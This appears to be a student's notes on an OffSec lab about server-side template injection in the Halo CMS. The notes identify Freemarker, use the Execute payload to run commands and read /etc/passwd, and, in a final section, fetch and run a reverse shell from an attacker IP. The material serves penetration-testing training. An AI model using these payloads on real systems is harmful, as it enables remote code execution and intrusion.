This Learning Unit covers the following Learning Objectives:

1. Understand the Halo application
2. Discover the template injection and the templating engine used on Halo
3. Exploit the template injection in the Halo application

Let's review a real-world application that is vulnerable to template injection. The application we'll review is aÂ _Content Management System_Â (CMS) calledÂ _Halo_.[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/mustache-and-handlebars-discovery-and-exploitation-31311/mustache-and-handlebars-exploitation-30988#fn-local_id_478-1)Â Halo doesn't currently support English, so we'll run the application with a translation plugin.

----------------
#### 11.7.1 Accessing Halo
Let's start the Halo machine listed below and make the corresponding IP address update on our Kali machine before starting our work.

```bash
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.50.105  halo
```
##### Labs


![[Pasted image 20241028210839.png]]
![[Pasted image 20241028210908.png]]

-------------
#### 11.7.2. Halo - Translation and Discovery

While SSTI vulnerabilities are not always authenticated, it is very common to find them within an admin section, which lets a more-privileged user add or edit templates. This is the case with Halo. For this reason, we'll be attacking Halo as an authenticated user. These credentials could have been discovered via a password dump or an authentication bypass vulnerability. In any case, we'll be using the SSTI vulnerability to escalate from an authenticated user to remote code execution. This vulnerability was discovered by the GitHub user any-how[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/halo-case-study-31318/accessing-halo-30992#fn-local_id_609-1)Â and assigned CVE-2020-21523.

|Username|Password|URL|
|---|---|---|
|admin|password|http://halo/admin|

> Table 2 - Credentials for Halo

Before we begin poking around the Halo CMS, we'll need to install Google Translate in the Burp Chromium browser. We'll start with Burp Suite open and click theÂ _Open Browser_Â button on theÂ _Proxy_Â tab.

![[Pasted image 20241028211235.png]]
Once Chromium opens, we'll navigate to the Google Translate Extension page[2](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/halo-case-study-31318/halo-translation-and-discovery-31008#fn-local_id_609-2)Â and clickÂ _Add to Chrome_.
![[Pasted image 20241028211437.png]]
At this point, let's navigate to the home page and attempt to translate it. We can translate an entire page by clicking the Google Translate extension and clicking onÂ _TRANSLATE THIS PAGE_.
If everything worked, the text should have been translated to English.
With the home page translated, let's navigate to the admin page, log in, and translate it.

![[Pasted image 20241028212236.png]]
Once logged in and translated, we can begin to search for an SSTI vulnerability to exploit. We can find SSTI vulnerabilities in many locations, but as with most vulnerabilities, user input is a great place to start.

When we have administrator access within an application, another great target to search for is a template editor (which might be used for user emails, for example) or a theme editor. Conveniently, Halo supports theme editing directly in the UI.

***This currently doesnt work for firefox***

![[Pasted image 20241028212629.png]]
Let's navigate to this page and try to discover which type of templating engine we're dealing with.
![[Pasted image 20241028212723.png]]
The right sidebar lets us select the theme file we want to edit. TheÂ .ftlÂ extension that we find here is often used for Freemarker templates. Let's selectÂ 404.ftlÂ and review its contents.

```python
01  <!DOCTYPE html>
02  <html>
03  <head>
04      <meta http-equiv="content-type" content="text/html; charset=utf-8">
05      <link rel="alternate" type="application/rss+xml" title="atom 1.0" href="/atom.xml">
06      <title>Not Found</title>
07      <link href="${static!}/source/css/style.min.css" type="text/css" rel="stylesheet"/>
08  </head>
09  <div class="page_404">
10      <p>The page you are looking for is missing</p>
11  </div>
12  </html>
```
Based on the name, we can assume that this page is loaded when the server responds with a "404 - Page Not Found" error. One of the parts of the document that sticks out is the use of an expression to output theÂ _static_Â variable. Let's useÂ curlÂ to send a request to a non-existent page and read the output to determine how this page might be displayed when rendered.

```bash
kali@kali:~$ curl -L http://halo/DoesNotExist 
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <link rel="alternate" type="application/rss+xml" title="atom 1.0" href="/atom.xml">
    <title>Not Found</title>
    <link href="http://halo/anatole/source/css/style.min.css" type="text/css" rel="stylesheet"/>
</head>
<div class="page_404">
    <p>The page you are looking for is missing</p>
</div>
</html>    
```

The expression in the template was translated to theÂ _static_Â variable. Given the file extension and the style of expression, we can assume that this is using the Freemarker templating engine. Let's perform some additional tests to verify this. We'll start by using double curly-brackets to multiply a number. If we are indeed working with Freemarker, we expect that this won't do much since these are not the delimiters that it uses. Let's add this payload to the end of the template.

```html
...
11  </div>
12  </html>
13  {{5*5}}
```
We'll clickÂ _save_Â on this document and useÂ curlÂ to review the output.
```bash
kali@kali:~$ curl -L http://halo/DoesNotExist
...
</html>
{{5*5}}
```
As expected, the value is not rendered. Let's try replacing the double curly-brackets with the default Freemarker delimiter.
```
...
11  </div>
12  </html>
13  ${5*5}
```
![[Pasted image 20241028213931.png]]

This time, we'll send a request and display the headers (withÂ -i) so that we can examine the response code.\

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[29Oct2024 01:39:50]-[/home/kali]
â””â”€# curl -L http://halo/DoesNotExist -i
HTTP/1.1 302 Found
Connection: keep-alive
Location: http://halo/DoesNotExist/index.html
Content-Length: 0
Content-Language: en-US
Date: Tue, 29 Oct 2024 01:39:54 GMT

HTTP/1.1 404 Not Found
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Transfer-Encoding: chunked
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Tue, 29 Oct 2024 01:39:55 GMT

<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <link rel="alternate" type="application/rss+xml" title="atom 1.0" href="/atom.xml">
    <title>Not Found</title>
    <link href="http://halo/anatole/source/css/style.min.css" type="text/css" rel="stylesheet"/>
</head>
<div class="page_404">
    <p>The page you are looking for is missing</p>
</div>
</html>
25              
```
The response indicates that multiplying a string and integer crashed the templating engine. At this point, we are very confident we're working with the Freemarker templating engine.

---------
#### 11.7.3. Halo - Exploitation

Now that we've discovered the template injection, let's build a payload that will execute commands on the target. We'll start by reviewing the rudimentary Freemarker expression to execute a command.

```html
${"freemarker.template.utility.Execute"?new()("whoami")}
```
![[Pasted image 20241028214413.png]]

This payload will return the current user executing the process. Let's replace the payload to instead display theÂ /etc/passwdÂ file, save the template, and useÂ curlÂ to render it.
![[Pasted image 20241028214435.png]]

When we render our payload, we find the contents of theÂ `/etc/passwd`Â file.

```bash
kali@kali:~$ curl -L http://halo/DoesNotExist
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Excellent! At this point, we can execute any command we want on the system.


##### Labs Extra Mile

![[Pasted image 20241028220746.png]]
Create Reverse shell
```bash
bash -i >& /dev/tcp/192.168.45.222/4444 0>&1
```

outputting the flag to `/tmp/revshell`
```js
${"freemarker.template.utility.Execute"?new()("curl -o /tmp/revshell http://192.168.45.222:80/revshell")}
```
![[Pasted image 20241028215456.png]]
![[Pasted image 20241028215516.png]]
changing permissions to `+x /tmp/revshell`
```js
${"freemarker.template.utility.Execute"?new()("chmod +x /tmp/revshell")}
```
executing the shell
```js
${"freemarker.template.utility.Execute"?new()("bash /tmp/revshell")}
```
![[Pasted image 20241028220556.png]]
catching the reverse shell
![[Pasted image 20241028220621.png]]
flag
![[Pasted image 20241028220653.png]]
